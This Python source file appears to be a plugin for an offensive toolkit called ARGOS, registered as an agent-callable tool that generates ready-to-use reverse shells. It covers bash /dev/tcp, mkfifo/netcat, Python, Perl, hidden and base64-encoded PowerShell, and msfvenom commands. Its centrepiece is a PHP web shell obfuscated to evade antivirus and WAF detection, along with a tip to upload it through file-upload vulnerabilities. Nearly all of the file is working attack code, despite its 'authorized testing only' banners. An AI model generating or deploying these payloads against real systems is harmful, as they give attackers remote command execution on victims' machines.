"""
ARGOS Plugin: Reverse Shell Generator
Generate configured reverse shells in multiple languages for authorized penetration testing.
Includes the PHP obfuscated variant from s-r-e-e-r-a-j/PHP-REVERSE-SHELL
(base64 IP encoding + reversed function names to evade static AV/WAF detection).

⚠️  FOR AUTHORIZED PENETRATION TESTING AND CTF CHALLENGES ONLY.

Repo: https://github.com/s-r-e-e-r-a-j/PHP-REVERSE-SHELL
"""
from __future__ import annotations
import base64, os, re, subprocess, tempfile
from pathlib import Path

MANIFEST = {
    "id":          "reverse_shells",
    "name":        "Reverse Shell Generator",
    "description": "Generate configured reverse shells (PHP obfuscated, bash, Python, Perl, nc, PowerShell). Authorized pentesting only.",
    "version":     "1.0.0",
    "author":      "ARGOS",
    "requires":    [],
}

_OUTPUT_DIR = Path("/opt/argos/loot/shells")


def _validate_ip_port(ip: str, port: int) -> str | None:
    if not re.match(r"^\d{1,3}(\.\d{1,3}){3}$", ip):
        return "Invalid IP address"
    if not (1 <= port <= 65535):
        return "Port must be between 1 and 65535"
    return None


def generate_reverse_shell(ip: str, port: int, shell_type: str = "php-obfuscated",
                            save_to_file: bool = False) -> dict:
    """Generate a configured reverse shell payload for authorized penetration testing.
    ⚠️  AUTHORIZED PENTESTING / CTF CHALLENGES ONLY.

    shell_type options:
      php-obfuscated  — PHP with base64 IP + reversed function names (evades static AV/WAF)
      php-classic     — Standard PHP reverse shell (pentestmonkey style)
      bash            — Bash /dev/tcp reverse shell
      bash-mkfifo     — Bash mkfifo reverse shell (works without /dev/tcp)
      python3         — Python3 socket reverse shell
      python2         — Python2 reverse shell
      perl            — Perl socket reverse shell
      nc              — Netcat reverse shell (various variants)
      nc-mkfifo       — Netcat with mkfifo (when -e is not available)
      powershell      — PowerShell reverse shell (Windows)
      powershell-b64  — PowerShell base64 encoded (bypasses basic filters)
      msfvenom-hint   — Shows msfvenom commands to generate payloads
    """
    err = _validate_ip_port(ip, port)
    if err:
        return {"error": err}

    shell_type = shell_type.lower().strip()
    generators = {
        "php-obfuscated":  _php_obfuscated,
        "php-classic":     _php_classic,
        "bash":            _bash,
        "bash-mkfifo":     _bash_mkfifo,
        "python3":         _python3,
        "python2":         _python2,
        "perl":            _perl,
        "nc":              _netcat,
        "nc-mkfifo":       _nc_mkfifo,
        "powershell":      _powershell,
        "powershell-b64":  _powershell_b64,
        "msfvenom-hint":   _msfvenom_hint,
    }

    if shell_type not in generators:
        return {
            "error":       f"Unknown shell_type '{shell_type}'",
            "available":   sorted(generators.keys()),
        }

    payload = generators[shell_type](ip, port)
    result: dict = {
        "ip":         ip,
        "port":       port,
        "shell_type": shell_type,
        "payload":    payload,
        "listener":   f"nc -lvnp {port}",
        "usage_note": "FOR AUTHORIZED PENETRATION TESTING ONLY",
    }

    # Optionally save to file
    if save_to_file:
        ext_map = {
            "php-obfuscated": "phtml", "php-classic": "php",
            "python3": "py", "python2": "py", "perl": "pl",
            "powershell": "ps1", "powershell-b64": "ps1",
        }
        ext = ext_map.get(shell_type, "sh")
        _OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
        fname = f"shell_{shell_type.replace('-','_')}_{ip.replace('.','_')}_{port}.{ext}"
        fpath = _OUTPUT_DIR / fname
        fpath.write_text(payload)
        result["saved_to"] = str(fpath)

    return result


def list_shell_types() -> dict:
    """List all available reverse shell types with descriptions."""
    return {
        "shell_types": [
            {"name": "php-obfuscated",  "desc": "PHP with base64 IP + reversed function names — evades static AV/WAF detection"},
            {"name": "php-classic",     "desc": "Classic pentestmonkey-style PHP reverse shell"},
            {"name": "bash",            "desc": "Bash /dev/tcp one-liner"},
            {"name": "bash-mkfifo",     "desc": "Bash with mkfifo (for systems without /dev/tcp)"},
            {"name": "python3",         "desc": "Python3 socket-based reverse shell"},
            {"name": "python2",         "desc": "Python2 reverse shell"},
            {"name": "perl",            "desc": "Perl socket reverse shell"},
            {"name": "nc",              "desc": "Netcat with -e flag"},
            {"name": "nc-mkfifo",       "desc": "Netcat with mkfifo (when -e is disabled)"},
            {"name": "powershell",      "desc": "PowerShell reverse shell (Windows)"},
            {"name": "powershell-b64",  "desc": "PowerShell base64-encoded (bypasses basic string filters)"},
            {"name": "msfvenom-hint",   "desc": "Shows msfvenom command to generate ELF/EXE/PHP payloads"},
        ],
        "listener_example": "nc -lvnp <port>",
        "tip": "Use 'php-obfuscated' (.phtml extension) for file upload vulnerabilities to evade AV.",
    }


# ─── Shell generators ─────────────────────────────────────────────────────────

def _php_obfuscated(ip: str, port: int) -> str:
    ip_b64 = base64.b64encode(ip.encode()).decode()
    # Function names reversed to evade static string scanning
    return f"""<?php
// PHP Reverse Shell — obfuscated variant
// Uses base64-encoded IP and reversed function names to bypass static AV/WAF
// Upload as .phtml and trigger via browser. Listen: nc -lvnp {port}
@error_reporting(0);
@ini_set('display_errors', 0);
set_time_limit(0);

$ip_b64 = '{ip_b64}';
$port   = {port};
$ip     = base64_decode($ip_b64);

// Reversed function names (bypass static analysis)
$f_sock  = strrev('nepokcosf');   // fsockopen
$f_shell = strrev('nepotcorp');   // proc_open
$f_kill  = strrev('esolctcorp');  // proc_close

while (true) {{
    $sock = @$f_sock($ip, $port);
    if ($sock) {{
        $descriptorspec = array(0=>$sock,1=>$sock,2=>$sock);
        $proc = @$f_shell('/bin/sh -i', $descriptorspec, array());
        if ($proc) {{
            while (!feof($sock)) {{
                $line = fgets($sock);
                fwrite($sock, shell_exec($line));
            }}
            @$f_kill($proc);
        }}
    }}
    sleep(5);
}}
?>"""


def _php_classic(ip: str, port: int) -> str:
    return f"""<?php
// Classic PHP Reverse Shell — pentestmonkey style
set_time_limit(0);
$ip   = '{ip}';
$port = {port};
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0=>$sock,1=>$sock,2=>$sock), $pipes);
?>"""


def _bash(ip: str, port: int) -> str:
    return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"


def _bash_mkfifo(ip: str, port: int) -> str:
    return f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port} >/tmp/f"


def _python3(ip: str, port: int) -> str:
    return (f'python3 -c \'import socket,subprocess,os;s=socket.socket();'
            f's.connect(("{ip}",{port}));'
            f'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
            f'subprocess.call(["/bin/sh","-i"])\'')


def _python2(ip: str, port: int) -> str:
    return (f'python -c \'import socket,subprocess,os;s=socket.socket();'
            f's.connect(("{ip}",{port}));'
            f'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
            f'subprocess.call(["/bin/sh","-i"])\'')


def _perl(ip: str, port: int) -> str:
    return (f"perl -e 'use Socket;"
            f'$i="{ip}";$p={port};'
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"connect(S,sockaddr_in($p,inet_aton($i)));"
            f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
            f"exec(\"/bin/sh -i\");'")


def _netcat(ip: str, port: int) -> str:
    return f"nc -e /bin/sh {ip} {port}"


def _nc_mkfifo(ip: str, port: int) -> str:
    return f"rm /tmp/f; mkfifo /tmp/f; nc {ip} {port} </tmp/f | /bin/sh -i 2>&1 | tee /tmp/f"


def _powershell(ip: str, port: int) -> str:
    return (f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
            f"\"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
            f"$stream = $client.GetStream();"
            f"[byte[]]$bytes = 0..65535|%{{0}};"
            f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
            f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
            f"$sendback = (iex $data 2>&1 | Out-String);"
            f"$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';"
            f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            f"$stream.Write($sendbyte,0,$sendbyte.Length);"
            f"$stream.Flush()}};$client.Close()\"")


def _powershell_b64(ip: str, port: int) -> str:
    raw = _powershell(ip, port)
    # Base64 encode for PowerShell -EncodedCommand
    encoded = base64.b64encode(raw.encode("utf-16-le")).decode()
    return f"powershell -EncodedCommand {encoded}"


def _msfvenom_hint(ip: str, port: int) -> str:
    return f"""# msfvenom payload generation commands for {ip}:{port}
# Linux ELF:
msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o shell.elf

# Windows EXE:
msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o shell.exe

# PHP:
msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -f raw -o shell.php

# Python:
msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw

# ASP (IIS):
msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f asp -o shell.asp

# Listener (Metasploit):
msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST {ip}; set LPORT {port}; run"

# Listener (netcat):
nc -lvnp {port}"""


TOOLS = {
    "generate_reverse_shell": {
        "fn": generate_reverse_shell,
        "description": (
            "Generate a configured reverse shell payload for authorized penetration testing. "
            "Types: php-obfuscated (base64 IP + reversed functions, evades AV), php-classic, "
            "bash, bash-mkfifo, python3, python2, perl, nc, nc-mkfifo, powershell, powershell-b64, msfvenom-hint. "
            "⚠️ AUTHORIZED PENTESTING / CTF CHALLENGES ONLY."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "ip":           {"type": "string",  "description": "Your listener IP address"},
                "port":         {"type": "integer", "description": "Your listener port"},
                "shell_type":   {"type": "string",  "description": "Shell type (default: php-obfuscated). Use list_shell_types() to see all options."},
                "save_to_file": {"type": "boolean", "description": "Save payload to /opt/argos/loot/shells/ (default: false)"},
            },
            "required": ["ip", "port"]
        }
    },
    "list_shell_types": {
        "fn": list_shell_types,
        "description": "List all available reverse shell types (PHP obfuscated, bash, Python, PowerShell, etc.) with descriptions.",
        "parameters": {
            "type": "object",
            "properties": {},
            "required": []
        }
    },
}
